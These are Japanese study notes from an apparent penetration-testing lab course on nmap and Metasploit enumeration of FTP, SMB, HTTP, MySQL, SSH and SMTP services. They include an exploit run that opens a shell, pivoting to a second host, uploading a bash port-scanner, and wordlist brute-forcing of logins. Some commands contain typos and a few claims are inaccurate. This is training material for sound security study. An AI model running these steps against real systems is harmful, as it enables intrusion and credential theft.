列挙について
・ホスト検出やペンテスの段階のポートスキャンを実行後、次の論理的な段階で、サービスの列挙する。
・サービス列挙の目的は、追加の情報を収集すること
→その中の情報は、ホストに関する追加情報やより具体的な詳細情報またはネットワーク上のシステムとそのホスト上で実行されているサービス
・スキャン段階での列挙はネットワーク上でリモートコンピュータとアクティブの接続を伴う。

nmapによるポートスキャンと列挙
・nmapは、ネットワーク上のホストを検出したり、開いているポートのターゲットをスキャンしたり、列挙も行う。
・列挙は、できるだけ多くの情報を収集または抽出すること
→基本的に、収集する情報は、開いているポートで実行されているサービスとバージョン

・以下のコマンド実行すると、ポートスキャンを行い、サービスのバージョンと実行中のOSを教えてくれる
nmap -Pn -sV -O IPアドレス

quiz
・nmapスキャン結果をMetasploitフレームワークにインポートすると有益な理由は、
・ターゲットがnmapでpingプローブをブロックしている場合、ーPnオプションを使用してバイパスする
・nmapの列挙機能を使用して収集できる情報は、サービスのバージョンとOS
・nmapの-sVフラグは、開いているポートで実行されているサービスのバージョンを識別する。

nmapでのスキャン結果をMetasploitフレームワークにインポートする
・ここで行うことは、結果をXMLに出力し、Metasploitにインポートする。

・以下のコマンドの流れで行う
1) service postgresql start 
2) msfconsole
3) db_status(データベースの状態確認）
4) workspace(確認する）
5) workspace -a 作りたいworkspace名
6) db_import directory（データベースへインポートしたい）
7) db_nmap -Pn -sV -O IPアドレス

quiz
・nmapスキャン結果をインポートする前にMetasploitで新しいワークスペースを作成が推奨される理由は、結果が整理されるようにするため
・nmap スキャン結果を使用するコンテキストでMetasploitフレームワークコンソールを起動する前の最初の手段は、DBの起動

タスク：Nmapスキャン結果をMSFにインポートする。
1) kaliLinuxを起動する。
2) 以下のコマンドで、ターゲットマシンにアクセスできるか確認する
ping -c 回数 IPアドレス
3) 以下のコマンドで、nmapスキャンを実行し、出力をXML形式で保存する。
nmap -sV -Pn -oX myscan.xml ドメイン名
4) 以下のコマンドで、postgresqlデータベースサービスを起動する。
service postgresql start
5) 以下のコマンドで、Metasploit Frameworkコンソールを起動する。
msfconsole
6) 以下のコマンドで、ＭＳＦデータベースが接続されていることを確認する
db_status
7) 以下のコマンドで、結果をインポートする。
db_import myscan.xml
8) 以下のコマンドで、hostとserviceで正しくできているかを確認する。
hosts
services

補助モジュールを使用したポートスキャン
・補助モジュールは、スキャン、探索、ファジングなどの機能を実行するために使用
→補助モジュールはペイロードとペアにすることはできない。
→補助モジュールは、ターゲットからの情報を抽出することを可能にする。

・ポートスキャンの流れ
1) ifconfig
2) service postgresql start 
3) mfconsole 
4) db_status
5) workspace -a 設定したい名前
6) search 使用したモジュールの名前
7) use directory name で移動。
8) set RHOSTS IPアドレスで、ターゲットのIPアドレスを設定
9) show options
10) curl IPアドレスでヘッダーの確認
11) sysinfroでターゲットの情報を確認

quiz
・Metasploitフレームワークの補助モジュールは主にスキャンとネットワーク検出に使用
・Metasploitの補助モジュールを使用してポートスキャンを設定するときにはhostとポート範囲を頻繁に設定する。

task Metasploitを使用して、1番目に脆弱性のあるマシンを利用してそこに接続されているマシンのポートスキャンを行う

task　1番目のターゲットから2番目のターゲットに侵入する
1) ターミナルを起動
2) ping -c 4 ターゲットドメイン
3) nmap ターゲットドメイン
4) 以下のコマンドで指定したドメインにHTTPリクエストを送って、そのページの内容を取得する。 
curl ターゲットドメイン
5) XODA Webアプリインスタンスがシステム上で実行されている場合は、metasploitモジュールの「exploit/unix/webapp/xoda_file_upload」を使用して悪用できる可能性がある。
6) msfconsole
7) 基本情報の設定
use exploit/unix/webapp/xoda_file_upload
set RHOSTS ターゲットドメイン
set TARGETURI /
set LHOST myドメイン
exploit
8) コマンドシェルを起動して、2番目のターゲットマシンのIPアドレス範囲を特定する。
shell
ip addr
9) meraploitのルーティングルートにルートを追加する。
run autoroute -s 侵入したipアドレス
10) 現在のmeterpreterセッションをバッググラウンドで動かして、metaploit portscan tcpモジュールを使用して2番目のターゲットマシンをスキャンする。
Ctrl+z（バッググラウンド実行にする)
use auxiliary/scanner/portscan/tcp
set RHOSTS ターゲットドメイン
set verbose false
set port 1-1000
exploit
11) 「/usr/bin/」ディレクトリで使用可能な静的バイナリの確認
ls -al /root/static-binaries/nmap
file /root/static-binaries/nmap
12) metasplotをバックグラウンドで実行して、bashポートスキャンスクリプトを作る。
[#!/bin/bash
for port in {1..1000}; do
 timeout 1 bash -c "echo >/dev/tcp/$1/$port" 2>/dev/null && echo "port $port is open"
done]
→bash-port-scanner.sh
13) metasploitをfgでフォアグラウンドにする。
sessions -i 1
14) nmap静的バイナリとbashスキャンスクリプトをターゲットマシンにアップロードする。
upload /root/static-binaries/nmap /tmp/nmap
upload /root/bash-port-scanner.sh /tmp/bash-port-scanner.sh
15) bashスクリプト実行可能にする。
shell
cd /tmp/
chmod +x ./nmap ./bash-port-scanner.sh 
./bash-port-scanner.sh ターゲットドメイン
16) ポートスキャンを実行
./nmap -p- targetIP




FTP列挙
・Metasploit Freiburg補助モジュールはできるだけ多くの情報を列挙する

・FTPは、TCPポート21を使うプロトコルで、サーバーとクライアントの間のファイル共有を容易にする。
→複数の補助モジュールを使って情報を列挙したり、FTPサーバー上で動作するターゲットに対してブルートフォース攻撃を行う。
→FTPの認証は、パスコードとユーザーネームで行うが、設備不備ののあるFTPサーバーは匿名ログインでアクセスできてしまう。

・プロセス
1）service postgresql start
2) ifconfig
3) msfconlose
4) workspace -a name
5) search portscan
6) use directry-name/tcp
7) show options 
8) set RHOSTS IPアドレス（2を3に変える）
9) run
10) back
11) search ftp
12) search type:auyiliary name:ftp
13) use directory-name
14) ifconfig
15) show options
16) set RHOST IPアドレス
17) run
というようにターゲットのRHOSTなどの変更などを行っていく。

quiz
・ftpブルートフォース攻撃によってサービスが一時的に無効になる原因は、ログイン試行回数が多すぎるとサーバーが過負荷になる。
＊ブルートフォース攻撃；パスワードなどのログイン情報を不正に取得するために考えられるすべての組み合わせを力任せに試すサイバー攻撃
・ftpは通常ポート21でホストされる。

task metasploitを使用してftp列挙を実行すること
1) kaliマシンにアクセス
2) pingコマンドを使用してターゲットの生死を確認。
3) 以下のコマンドを使用してmetasploit framework msfconsoleを起動
msfconsole
4) 以下のモジュールを使用して、ターゲット上で実行されているftpサーバーのサービスを識別する必要がある。
use auxiliary/scanner/ftp/ftp_version
5) 以下のモジュールオプションを使用して、ターゲットのオプションを設定
set RHOSTS ドメイン名
6) 以下のコマンドでモジュールを実行
run
7) 以下のコマンドを使用して、認証に使用できる正当な資格情報を取得するために、ftpサーバーでブルートフォース攻撃を実行する。
use auxiliary/scanner/ftp/ftp_login
6) 以下のコマンドでより具体的なターゲットオプションを構成
set RHOSTS ドメイン名
7) 以下のコマンドで、USER_FILEおよびPASS_FILEオプションを設定する（ブルートフォース攻撃をしてるため）
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
7) 以下のコマンドで実行
run
8) 以下のコマンドでftpサーバーで匿名ログオンが許可されているかを確認
use auxiliary/scanner/ftp/anonymous
set RHOSTS ドメイン名
run
9) 上記でログイン可能になったら、以下のコマンドでftpにログイン（ログインとパスワードはブルーどフォースで判明したものを使用）
ftp ドメイン名


SMB列挙
・SMBから可能な限り多くの情報を列挙するための補助モジュール

・SMBとは、LAN上でのコンピュータ間でのファイルと周辺機器の共有を促進するために使用されるネットワークファイルを共有するためのプロトコル
・SMBはポート445を使う。
・LinuxのSMB実装を行うのは、Sambaであり、基本的にwindowsでは、システムからlinuxの共有やデバイスにアクセスしたりその逆を行ったりできる。

・プロセス
1) ifconfigでIPアドレスの取得
2) service postgresql start
3) mfsconsole
4) workspace a name
5) setg RHOSTS IPアドレス（3に設定）
SMB補助を検索するプロセス
1) search smb
2) search type:auxiliary name:smb
3) use バージョンモデル
4) show options
5) run

quiz
・smb列挙では、ターゲットシステム上の共有にアクセスできることが便利な理由は、機密性の高いファイルにアクセスできるから
・smbバージョンを列挙する目的は、脆弱性と対象となるOSを特定する。
・smbユーザーを列挙するために使用されるmetasploit補助モジュールは、「auxiliary/scanner/smb_enumusers」

task smbサーバの偵察を実行し、ネットワーク上のsmbサーバーからの情報を識別して抽出する方法
1) kalilinuxを起動
2) 以下のコマンドで、smbdで使用されるデフォルトのtcpポートを見つける。
nmap ドメイン名
3) 以下のコマンドで、nmbdで使用されるデフォルトのudpポートを見つける
nmap -sU --top-ports 25 ドメイン名
4) 以下のコマンドでsambaサーバーのワークグループを見つける
nmap -sV -p 445 ドメイン名
5) 以下のコマンドで、nmapスクリプトで、sambaサーバーの正確なバージョンを見つける。
nmap --script smb-os-discovery.nse -p 445 ドメイン名
6) 以下のコマンドで、smb_version metasploitモジュールを使用して、sambaサーバーの正確なバージョンを見つける
msfconsole -q
use auxiliary/scanner/smb/smb_version
set RHOSTS ドメイン名
exploit
7) nmapを使用して、sambaサーバのnetbiosコンピュータの名前を見つける
nmap --script smb-os-discovery.nse -p 445 ドメイン名
8) nmblookupを使用して、sambaサーバのnetbiosコンピュータ名を見つける
nmblookup -A ドメイン名
9) smbclientを使用して、sambaサーバーで匿名接続が許可されているかを確認する
smbclient -L ドメイン名 -N
10) rpcclientを使用して、sambaサーバーで匿名接続が許可されているかを確認する
rpcclient -U "" -N ドメイン名

webサーバーの列挙
・webサーバーは、web上でWebサイトのデータを提供するために使用されるソフトウェア
・Webサーバーは、クライアントとwebサーバー間のコミュニケーションを促進するためにhttpを利用する。
・httpは、コミニュケーションのためにtcp port 80を利用するアプリケーション層プロトコルである
→暗号化のためにssl証明書を設定すると、ポートは443になる。
・ウェブサーバーのバージョン、httoヘッダー、ブルートフォース攻撃を列挙するために列挙モジュールを利用することができる
・webサイトの例としては、apache,nginx,microsoft IIS

・robots.txtは、ウェブサーバーのルートであり、検索エンジンがインデックスを作成するのを防ぐために使用する。

・プロセス
1) ifconfig
2) service postgresql start
3) msfconsole
4) workspace -a name
5) setg RHOST IPアドレス
6) search http
7) search type:auxiliary name:http
8) use auxiliary/scanner/http/http_version
9) show options
10) run
11) search http_header
12) use 
13) show options
14) run
15) search robots_txt
16) use auxiliary/scanner/http/robots_txt
17) show options
18) run
19) curl http://IPアドレス/data
20) curl http://IPアドレス/secure
21) search dir scannner
*デイレクトりブルートフォース攻撃：
22) use auxiliary/scanner/http/dir_scannner
23) run
24) search file_dir
25) set DICTIONARY /usr/share/wordlists/
26) show options
27) run
28) search http_login
29) use
30) show options
31) set AUTH_URI /secure/
32) unset USERNAME_FILE
33) run
34) show options
35) set USER_FILE /usr/share/metasploit-framework/data/wordlists/namelist.txt
36) set PASS_FILE /usr/share/metasploit-framework/data/ordlists/unix_passwords.txt
37) run
38) show options
39) set VERBOSE true
40) run

quiz
・列挙の目的でhttpヘッダーを取得するために使用されるhttpリクエストメソッドは、GET
・

task 標的のapacheウェブサーバーに関する情報を可能な限り収集すること
1) kalilinuxを起動
2) pingコマンドを使ってターゲットマシンにアクセスできるか確認する。
3) 以下のコマンドで、metasploitフレームワークコンソールを開く
mfsconsole -q
4) ターゲットに対して、metasploit補助モジュールを1つずつ実行


Mysqlの列挙
・MySQLとは、SQLをベースにしたオープンソースのリレーショナルデータベース管理システム
・通常は、顧客データに関連する様々なタイプのデータの記録に使用される
→最も一般的なのは、web applicatiom dataを保存するために使用される
・検出を回避するために、MySQLはデフォルトでは、TCPポート3306に設定されているものを変更する。

・プロセス
1) ifconfigでターゲットのIPアドレスを取得
2) service postgresql start
3) msfconsole
4) workspace -a name
5) setg RHOSTS IPアドレス
6) setg RHOST IPアドレス
7) search type:auxiliary name:sql
8) use auxiliary/scanner/mysql/mysql_version
9) show options
10) search portacan
11) use auxiliary/scanner/portscan/tcp
12) show options
13) run
14) use auxiliary/scanner/mysql/mysql_version
15) show options
16) run
17) search mysql_login
18) use use auxiliary/scanner/mysql/mysql_iogin
19) show options
20) set USERNAME root
21) set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
22) run
23) search mysql_enum
24) use auxiliary/admin/mysql/mysql_enum
25) info
26) set PASSWORD twinkle
27) set USERNAME root
28) run
29) search my_sql
30) use auxiliary/admin/mysql/mysql_sql
31) show options
32) set PASSWORD twinkle
33) set USERNAME root
34) run
35) show options
36) set SQL show databases;
37) run
38) 

SSH列挙
・sshは、暗号化機能を備えたリモート管理プロトコルである。
・通常は、サーバーやシステムへのリモートアクセスで使用する。
・sshのデフォルトのポートは22
→空いているポートを使用するように設定可能
・補助モジュールを利用して、ターゲットで実行されているSSHのバージョンを列挙したり、ブルートフォース攻撃を実行してパスワードを特定し、結果としてターゲットへのリモートアクセスを可能にしたりすることができます。

quiz
・クリアテキストパスワードではなくsshキーベースの認証を使用する利点は、キーはより安全な認証方法を提供する。

smtp列挙
・smtpは、電子メールの送信で使用されるコミュニケーションプロトコル
・smtpはデフォルトでport25を使用する。また、tcp port465と587で実行するように設定することも可能

quiz
・smtp列挙モジュールは、ユーザーアカウントを提供する















